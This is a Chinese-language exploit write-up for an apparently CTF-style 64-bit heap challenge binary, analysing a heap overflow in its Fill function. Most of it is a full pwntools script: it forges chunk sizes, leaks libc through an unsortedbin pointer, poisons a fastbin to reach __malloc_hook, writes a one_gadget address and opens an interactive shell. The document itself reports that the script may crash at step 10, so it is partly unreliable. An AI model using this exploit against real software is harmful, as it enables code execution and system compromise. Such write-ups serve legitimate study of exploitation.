# 漏洞利用文档

## 执行环境

基于exp脚本和调试记录分析，程序运行环境如下：
- **二进制文件**：`./data/sample7`，64位ELF程序
- **保护机制**：启用PIE、NX、Canary、Full RELRO（从调试记录中内存地址随机化和崩溃信息推断）
- **依赖库**：使用系统libc（通过`elf.libc`获取），依赖标准C库和堆管理函数
- **运行要求**：需要在Linux环境下执行，使用pwntools进行漏洞利用，程序通过菜单交互管理堆块

关键环境特征：
- 堆分配使用ptmalloc2实现
- 程序通过管理数组（基址如`0x2c288f9da160`）跟踪堆块状态
- 最大支持16个堆块，每个堆块最大4096字节

## 漏洞成因

### 关键结构体
```c
struct chunk {
    int in_use;        // 是否正在使用 (4字节)
    size_t size;       // 块大小 (8字节)  
    void *data;        // 数据指针 (8字节)
};
// 总大小24字节，在内存中以数组形式存储
```

### 漏洞分析
**漏洞位置**：`sub_E7F`函数（Fill功能）

**漏洞类型**：堆溢出

**根本原因**：
在Fill功能中，程序允许用户指定任意大小的数据进行填充，但未验证输入大小是否小于或等于该堆块实际分配的大小：
```c
printf("Size: ");
result = sub_138C();  // 读取用户输入的大小v3
v3 = result;
if ( (int)result > 0 )
{
    printf("Content: ");
    return sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), v3);  // 直接使用用户控制的v3进行数据读取
}
```

**漏洞影响**：
- 攻击者可以写入超出堆块边界的数据
- 覆盖相邻堆块的元数据（prev_size、size字段）
- 可能覆盖管理数组中的指针和状态字段
- 最终实现任意地址读写或代码执行

## 漏洞利用过程

### 利用步骤概览
| 步骤 | 操作 | 关键内存变化 | 利用目的 |
|------|------|---------------|----------|
| 1 | `alloc(0x10);alloc(0x10);alloc(0x30);alloc(0x40);alloc(0x60)` | 创建初始堆布局：5个堆块连续分配 | 准备溢出目标 |
| 2 | `fill(0,p64(0x51)*4);fill(2,p64(0x31)*6)` | 堆块0溢出覆盖堆块1的size为0x51，堆块2数据写入 | 伪造堆块大小 |
| 3 | `free(1)` | 堆块1进入0x50 fastbin，管理数组状态不一致 | 创建UAF条件 |
| 4 | `alloc(0x40)` | 从fastbin重新分配堆块1，管理数组指针修复 | 重用释放的堆块 |
| 5 | `fill(1,p64(0x91)*4)` | 堆块1溢出覆盖堆块2的size为0x91 | 准备unsortedbin攻击 |
| 6 | `free(2)` | 堆块2进入unsortedbin，bk指针指向main_arena+88 | 泄漏libc地址 |
| 7 | `dump(1)` | 读取堆块1数据，解析bk指针获取main_arena地址 | 计算libc基址 |
| 8 | `free(4)` | 堆块4进入0x70 fastbin | 准备fastbin攻击 |
| 9 | `fill(3,payload)` | 堆块3溢出伪造fastbin链表，指向malloc_hook附近 | 劫持控制流 |
| 10 | `alloc(0x60);alloc(0x60)` | 分配触发fastbin攻击，但fd指针损坏导致崩溃 | 尝试获取shellcode执行 |

### 关键内存状态变化
- **堆布局演变**：从规整布局→元数据伪造→bins链表操纵
- **管理数组异常**：多次出现in_use标志与实际堆状态不一致
- **bins状态**：fastbins和unsortedbin被精心操纵用于地址泄漏和控制流劫持
- **libc泄漏**：通过unsortedbin的bk指针成功获取main_arena地址

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample7')
elf = ELF('./data/sample7')
libc = elf.libc

def alloc(size):
    p.recvuntil(b'Command: ')
    p.sendline(b'1')
    p.sendline(str(size).encode())

def fill(idx, payload):
    p.recvuntil(b'Command: ')
    p.sendline(b'2') 
    p.sendline(str(idx).encode())
    p.sendline(str(len(payload)).encode())  # 漏洞点：可指定任意大小，不检查实际分配大小
    p.send(payload)

def free(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'3')
    p.sendline(str(idx).encode())

def dump(idx):
    p.recvuntil(b'Command: ')
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content: \n')

# 步骤1：创建初始堆布局
alloc(0x10)  # 索引0 - 用于溢出堆块1
alloc(0x10)  # 索引1 - 主要攻击目标
alloc(0x30)  # 索引2 - 用于泄漏libc
alloc(0x40)  # 索引3 - 用于伪造fastbin链表
alloc(0x60)  # 索引4 - 辅助堆块

# 步骤2：堆溢出攻击 - 伪造堆块大小
fill(0, p64(0x51)*4)  # 溢出堆块0，覆盖堆块1的size为0x51
fill(2, p64(0x31)*6)  # 填充堆块2数据

# 步骤3-4：UAF利用 - 释放后重新分配
free(1)  # 释放堆块1到0x50 fastbin
alloc(0x40)  # 重新分配，重用堆块1但大小不同

# 步骤5-6：准备unsortedbin攻击
fill(1, p64(0x91)*4)  # 溢出堆块1，覆盖堆块2的size为0x91
free(2)  # 释放堆块2到unsortedbin，bk指针指向main_arena

# 步骤7：泄漏libc地址
dump(1)  # 转储堆块1数据
p.recv(0x20)  # 跳过前0x20字节
SBaddr = u64(p.recv(8))  # 读取unsortedbin的bk指针
p.recvline()
malloc_hook = SBaddr - 88 - 0x10  # 计算__malloc_hook地址
log.info(f"Leaked main_arena: {hex(SBaddr)}")
log.info(f"malloc_hook: {hex(malloc_hook)}")

# 步骤8-9：fastbin攻击准备
free(4)  # 释放堆块4到0x70 fastbin
# 构造payload：伪造fastbin链表指向malloc_hook附近
payload = p64(0)*9 + p64(0x71) + p64(malloc_hook - 0x23)
fill(3, payload)  # 溢出堆块3，覆盖堆块4的fd指针

# 步骤10-11：尝试获取shell
alloc(0x60)  # 第一次分配 - 从fastbin获取堆块4
alloc(0x60)  # 第二次分配 - 应获取伪造的malloc_hook附近 chunk

# 计算one_gadget地址并写入
libc_addr = malloc_hook - libc.symbols['__malloc_hook']
payload = p64(libc_addr + 0x4527a)  # one_gadget地址
shllcode = b'a'*0x13 + payload  # 填充对齐后写入one_gadget
fill(4, shllcode)  # 写入shellcode到malloc_hook

# 步骤12-13：触发执行
alloc(1)  # 触发malloc，执行one_gadget
p.sendline(b'bash')  # 发送命令
p.interactive()  # 获取交互式shell
```

### 关键注释说明
- **漏洞利用核心**：通过堆溢出伪造堆块大小，操纵bins链表实现任意地址写
- **libc泄漏**：利用unsortedbin的bk指针指向main_arena的特性泄漏libc基址
- **控制流劫持**：通过fastbin攻击将malloc_hook覆盖为one_gadget地址
- **利用限制**：需要精确的堆布局控制和地址计算，对payload构造要求较高

### 已知问题
根据调试记录，利用在步骤10可能因fastbins链表损坏而崩溃，建议：
1. 调整payload大小确保完全覆盖目标地址
2. 验证堆块对齐和大小计算
3. 使用更稳定的one_gadget偏移
